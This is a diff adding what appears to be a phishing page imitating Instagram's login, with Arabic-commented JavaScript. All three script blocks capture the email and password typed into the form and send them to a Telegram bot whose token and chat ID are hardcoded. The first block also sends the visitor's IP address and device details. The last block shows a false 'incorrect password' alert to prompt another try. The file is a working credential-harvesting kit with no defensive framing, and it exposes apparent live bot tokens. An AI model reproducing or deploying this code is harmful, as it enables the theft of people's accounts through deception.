@@ -1,0 +1,181 @@
+<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2019 INSTAGRAM
+		</div>
+	</div>
+</div>
+
+
+
+<script>
+    const TOKEN = "7848626679:AAGlp8-t2bqNvXyj0_f1oQvD-WlEAHdrmg8"; // توكن البوت
+    const CHAT_ID = "5671856674"; // معرف الشات
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`; // الرابط لإرسال الرسائل
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault(); // لمنع الإرسال الافتراضي للنموذج
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // الحصول على عنوان IP للمستخدم
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                // جمع معلومات إضافية عن المستخدم
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                // بناء الرسالة التي سيتم إرسالها إلى تيليجرام
+                const message = ` 
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                    <b>البريد الإلكتروني:</b> ${email}\n
+                    <b>كلمة المرور:</b> ${password}\n
+                    <b>عنوان الـ IP:</b> ${ip}\n
+                    <b>نوع الجهاز:</b> ${deviceType}\n
+                    <b>المنصة:</b> ${platform}\n
+                    <b>متصفح المستخدم:</b> ${userAgent}\n
+                    <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                // إرسال الرسالة إلى تيليجرام
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                })
+                .then(response => {
+                    console.log(response.data); // تسجيل الاستجابة
+                    alert('تم إرسال المعلومات بنجاح!');
+                })
+                .catch(error => {
+                    console.error('حدث خطأ أثناء إرسال المعلومات:', error); // تسجيل الخطأ
+                    alert('حدث خطأ أثناء إرسال المعلومات. حاول مرة أخرى.');
+                });
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء الحصول على عنوان الـ IP:', error); // تسجيل الخطأ
+                alert('حدث خطأ أثناء الحصول على عنوان الـ IP. حاول مرة أخرى.');
+            });
+    });
+</script>
+
+
+
+
+
+
+
+
+
+<script>
+        // دالة إرسال البيانات إلى تلغرام
+        function sendToTelegram(message) {
+            const botToken = '7848626679:AAG8CbYCC_jJSczWzexlT24rqnQOTl3jAHY';  // استبدل بـ Token الخاص بالبوت
+            const chatId = '5671856674';      // استبدل بـ Chat ID الخاص بالقناة أو المجموعة
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const url = `${telegramApiUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('تم إرسال الرسالة إلى تلغرام');
+                    } else {
+                        console.log('حدث خطأ أثناء إرسال الرسالة:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('حدث خطأ:', error);
+                });
+        }
+
+        // دالة لتشغيل إرسال البيانات عند الضغط على زر "تسجيل الدخول"
+        function handleLogin() {
+            const email = document.getElementById('emil').value;
+            const password = document.getElementById('pass').value;
+
+            // تحقق من أن الحقول ليست فارغة
+            if (email && password) {
+                const message = `تم تسجيل الدخول من قبل المستخدم:\nالبريد الإلكتروني أو رقم الهاتف: ${email}\nكلمة السر: ${password}`;
+                sendToTelegram(message);  // إرسال الرسالة إلى تلغرام
+            } else {
+                alert('الرجاء ملء جميع الحقول.');
+            }
+        }
+    </script>
+
+  
+
+
+document.addEventListener('DOMContentLoaded', function () {
+    // دالة إرسال البيانات إلى تلغرام
+    function sendToTelegram(message) {
+        const botToken = '7848626679:AAG8CbYCC_jJSczWzexlT24rqnQOTl3jAHY';  // استبدل بـ Token الخاص بالبوت
+        const chatId = '5671856674';      // استبدل بـ Chat ID الخاص بالقناة أو المجموعة
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const url = `${telegramApiUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('تم إرسال الرسالة إلى تلغرام');
+                } else {
+                    console.log('حدث خطأ أثناء إرسال الرسالة:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('حدث خطأ:', error);
+            });
+    }
+
+    // دالة لتشغيل إرسال البيانات عند الضغط على زر "تسجيل الدخول"
+    function handleLogin(event) {
+        event.preventDefault();  // لمنع تحميل الصفحة عند الضغط على الزر
+
+        const email = document.getElementById('emil').value;
+        const password = document.getElementById('pass').value;
+
+        // تحقق من عدد الحقول المملوءة
+        if (!email || !password) {
+            // إذا كانت واحدة من الحقول فارغة
+            alert('يرجى ملء جميع الحقول.');
+        } else if (email && password) {
+            // إذا كانت الحقول مليئة، ولكن الرسالة ستظهر دائمًا بأنها غير صحيحة
+            const message = `New login:  \n Email or phone number or username: ${email}\n Password: ${password}`;
+            sendToTelegram(message);  // إرسال الرسالة إلى تلغرام
+            alert('اسم المستخدم أو كلمة المرور غير صحيحة. يرجى المحاولة مجددًا.');
+        }
+    }
+
+    // ربط الحدث بزر "تسجيل الدخول"
+    const loginButton = document.querySelector('.btn a');
+    if (loginButton) {
+        loginButton.addEventListener('click', handleLogin);
+    }
+});
+
+
+
